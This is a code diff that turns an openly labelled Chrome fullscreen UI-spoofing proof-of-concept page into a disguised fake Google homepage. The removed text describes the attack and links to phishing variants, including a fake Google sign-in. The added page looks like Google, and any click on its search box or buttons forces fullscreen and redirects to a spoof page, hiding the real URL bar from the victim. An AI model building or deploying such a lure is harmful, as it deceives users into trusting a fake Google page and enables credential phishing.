@@ -2,101 +2,64 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Chrome Fullscreen UI Spoof - POC</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>Google</title>
 <style>
-  body { font-family: Arial, sans-serif; background: #0a0a0f; color: #ddd; padding: 20px; }
-  .container { max-width: 620px; margin: 0 auto; }
-  h1 { font-size: 20px; color: #fff; }
-  h1 span { color: #ff4444; }
-  .badge { display: inline-block; padding: 3px 10px; border-radius: 3px; font-size: 11px; margin: 2px; }
-  .b-r { background: rgba(255,68,68,.15); color: #ff4444; }
-  .b-g { background: rgba(0,230,118,.15); color: #00e676; }
-  .card {
-    background: #14141e; border: 1px solid #222233;
-    border-radius: 10px; padding: 16px; margin-bottom: 14px;
-  }
-  .card h3 { font-size: 15px; color: #fff; margin-bottom: 8px; }
-  .card p { font-size: 12px; color: #888; line-height: 1.5; margin-bottom: 10px; }
-  .card a {
-    display: inline-block; padding: 10px 18px; margin: 3px;
-    border: 1px solid #444; border-radius: 6px; color: #ddd;
-    text-decoration: none; font-size: 13px;
-  }
-  .card a:hover { border-color: #ff4444; background: rgba(255,68,68,.06); }
-  .card a.primary { border-color: #ff4444; color: #ff4444; }
-  pre { background: #0d0d16; padding: 12px; border-radius: 6px; font-size: 11px; color: #888; overflow-x: auto; line-height: 1.5; }
+* { margin:0; padding:0; box-sizing:border-box; }
+body {
+  font-family: Roboto, Arial, sans-serif; background: #fff;
+  display: flex; align-items: center; justify-content: center;
+  min-height: 100vh; flex-direction: column; padding: 20px;
+  -webkit-tap-highlight-color: transparent;
+}
+.logo { font-size: 68px; font-weight: 400; margin-bottom: 28px; }
+.g{color:#4285f4}.o1{color:#ea4335}.o2{color:#fbbc05}.g2{color:#4285f4}.l{color:#34a853}.e{color:#ea4335}
+.search {
+  width: 85vw; max-width: 440px; padding: 14px 20px; font-size: 16px;
+  border: 1px solid #dfe1e5; border-radius: 24px; outline: none;
+  box-shadow: 0 1px 6px rgba(32,33,36,.1); text-align: center; cursor: pointer;
+}
+.btns { margin-top: 18px; display: flex; gap: 8px; }
+.btns button {
+  background: #f8f9fa; border: 1px solid #f8f9fa;
+  padding: 10px 18px; border-radius: 4px; font-size: 14px;
+  color: #3c4043; cursor: pointer;
+}
+.lang { margin-top: 24px; font-size: 12px; color: #5f6368; }
 </style>
 </head>
 <body>
-<div class="container">
 
-<h1>Chrome Fullscreen <span>UI Spoofing</span> POC</h1>
-<p style="color:#888;font-size:13px;margin-bottom:16px;">
-  <span class="badge b-r">Security UI Spoofing</span>
-  <span class="badge b-r">CWE-451</span>
-  <span class="badge b-g">Chrome Android/Desktop</span>
-</p>
-
-<div class="card">
-  <h3>Attack Summary</h3>
-  <p>
-    When a page enters <strong>fullscreen mode</strong>, the browser's URL bar and all
-    security indicators are <strong>completely hidden</strong>. The page can then draw
-    <strong>fake browser UI</strong> — a spoofed URL bar showing a trusted domain
-    (google.com) with a lock icon. The victim has <strong>no way to verify</strong>
-    the real URL without knowing the fullscreen exit gesture.
-  </p>
-  <pre>
-┌─────────────────────────────┐
-│ 🔒 www.google.com      ⋮  │ ← FAKE URL bar (drawn by page)
-├─────────────────────────────┤
-│         Google              │ ← Real attacker page
-│   [malicious content]       │
-│                             │
-└─────────────────────────────┘
-  Actual URL (hidden): https://telojos11.github.io/jontro/...</pre>
+<div class="logo">
+  <span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
 </div>
 
-<div class="card">
-  <h3>POC Pages (tap to test on Android)</h3>
-  <a class="primary" href="fullscreen-spoof/fake-chrome.html">Fake Chrome Browser UI</a>
-  <a href="fullscreen-spoof/google-search.html">Google Search + Download</a>
-  <a href="fullscreen-spoof/google-login.html">Google Sign-In Phishing</a>
+<input class="search" id="q" type="text" placeholder="Search Google or type a URL" autocomplete="off" readonly>
+
+<div class="btns">
+  <button id="b1">Google Search</button>
+  <button id="b2">I'm Feeling Lucky</button>
 </div>
 
-<div class="card">
-  <h3>How It Works</h3>
-  <p>
-    1. <strong>Social engineering</strong> — page shows a fake prompt: "Google needs to open a secure session"
-    <br>2. User taps <strong>"Continue"</strong> → page enters fullscreen via <code>requestFullscreen()</code>
-    <br>3. <strong>Real URL bar disappears</strong> — browser chrome is hidden
-    <br>4. Page draws <strong>fake Chrome UI</strong> with spoofed URL + lock icon
-    <br>5. Victim sees "google.com" in the fake URL bar — trusts the page completely
-    <br>6. Phishing form / download / permission prompt follows
-  </p>
-</div>
+<p class="lang">Google offered in: Bahasa Indonesia</p>
 
-<div class="card">
-  <h3>Why This Works on Android Chrome</h3>
-  <p>
-    • Fullscreen hides: URL bar, status bar, navigation buttons
-    <br>• Exit gesture (swipe from top) is <strong>not intuitive</strong> for most users
-    <br>• Fake browser UI is <strong>indistinguishable</strong> from real Chrome UI
-    <br>• Combined with a Google-lookalike page = <strong>perfect phishing</strong>
-    <br>• No patch exists — hiding UI is the <strong>intended behavior</strong> of fullscreen API
-  </p>
-</div>
+<script>
+(function() {
+  function go() {
+    var el = document.documentElement;
+    if (el.requestFullscreen) el.requestFullscreen().catch(function(){});
+    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
 
-<div class="card">
-  <h3>Variants Demonstrated</h3>
-  <p>
-    <b>Fake Chrome Browser:</b> Complete fake Android Chrome UI (status bar + URL bar + tabs)
-    <br><b>Google Search Spoof:</b> Fake search results + download prompt showing "from google.com"
-    <br><b>Google Sign-In:</b> Full Google login flow phishing with fake accounts.google.com URL
-  </p>
-</div>
+    setTimeout(function() {
+      window.location.href = 'spoof.html';
+    }, 400);
+  }
 
-</div>
+  document.getElementById('q').addEventListener('click', go);
+  document.getElementById('b1').addEventListener('click', go);
+  document.getElementById('b2').addEventListener('click', go);
+})();
+</script>
+
 </body>
 </html>
